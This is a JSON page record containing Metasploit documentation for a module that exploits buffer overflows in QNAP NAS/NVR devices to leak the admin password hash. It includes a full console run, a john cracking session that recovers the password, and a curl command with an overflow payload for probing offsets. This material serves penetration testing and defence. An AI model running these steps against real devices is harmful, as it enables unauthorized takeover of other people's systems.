{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/gather/qnap_backtrace_admin_hash","result":{"data":{"moduleMetadataJson":{"id":"6ec95cbf-ef79-5e34-a74f-c242a65a3839","name":"QNAP NAS/NVR Administrator Hash Disclosure","fullname":"auxiliary/gather/qnap_backtrace_admin_hash","description":"This module exploits combined heap and stack buffer overflows for QNAP\n        NAS and NVR devices to dump the admin (root) shadow hash from memory via\n        an overwrite of __libc_argv[0] in the HTTP-header-bound glibc backtrace.\n\n        A binary search is performed to find the correct offset for the BOFs.\n        Since the server forks, blind remote exploitation is possible, provided\n        the heap does not have ASLR.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/gather/qnap_backtrace_admin_hash","documentationSlug":"/modules/documentation/auxiliary/gather/qnap_backtrace_admin_hash"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This is going to be a quick rundown of how to use this module to\nretrieve the admin hash from a vulnerable QNAP device.</p>\n<p>The defaults I've set should be adequate for blind exploitation, but you\nmay need to tweak them for your target.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>OFFSET_START</strong></p>\n<p>You want to set this to a value where you can see a backtrace. Set this\nlower if you're not sure. Default is 2000.</p>\n<p><strong>OFFSET_END</strong></p>\n<p>Set this option to a value where you don't see a backtrace. Set this\nhigher if you're not sure. Default is 5000.</p>\n<p><strong>RETRIES</strong></p>\n<p>Sometimes the attack won't be successful on the first run. This option\ncontrols how many times to retry the attack. Default is 10.</p>\n<p><strong>VERBOSE</strong></p>\n<p>This will tell you how long the binary search took and how many requests\nwere sent during exploitation. Default is false.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<p>Let's run through a successful exploitation. I've tailored the options\nto my target. Your target may differ.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/gather/qnap_backtrace_admin_hash \nmsf auxiliary(qnap_backtrace_admin_hash) &gt; set rhost [redacted]\nrhost =&gt; [redacted]\nmsf auxiliary(qnap_backtrace_admin_hash) &gt; set offset_end 3000\noffset_end =&gt; 3000\nmsf auxiliary(qnap_backtrace_admin_hash) &gt; set verbose true\nverbose =&gt; true\nmsf auxiliary(qnap_backtrace_admin_hash) &gt; run\n\n[*] QNAP [redacted] detected\n[*] Binary search of 2000-3000 completed in 5.02417s\n[*] Admin hash found at 0x8068646 with offset 2920\n[+] Hopefully this is your hash: $1$$vnSTnHkIF96nN6kxQkZrf.\n[*] 11 HTTP requests were sent during module run\n[*] Auxiliary module execution completed\nmsf auxiliary(qnap_backtrace_admin_hash) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>We got lucky on this run. Sometimes it takes a couple retries to get the\nhash. Now what do we do with it...</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">wvu@kharak:~$ john --wordlist --rules --format=md5crypt shadow\nLoaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 SSSE3 20x])\nPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status\nhunter2          (admin)\n1g 0:00:00:01 DONE (2017-03-15 04:41) 0.8928g/s 24839p/s 24839c/s\n24839C/s flipper2..mercury2\nUse the &quot;--show&quot; option to display all of the cracked passwords reliably\nSession completed\nwvu@kharak:~$ </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Cracked! Now you can log in to the device. Shells await!</p>\n<h2 id=\"addendum\" style=\"position:relative;\"><a href=\"#addendum\" aria-label=\"addendum permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Addendum</h2>\n<p>I used this <code class=\"language-text\">curl</code> command to test for offsets:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">curl -kv &quot;https://[redacted]/cgi-bin/cgi.cgi?u=admin&amp;p=$(perl -e &#39;print &quot;A&quot;x2000&#39; | base64 -w 0)&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>"}}},"pageContext":{"id":"6ec95cbf-ef79-5e34-a74f-c242a65a3839"}}}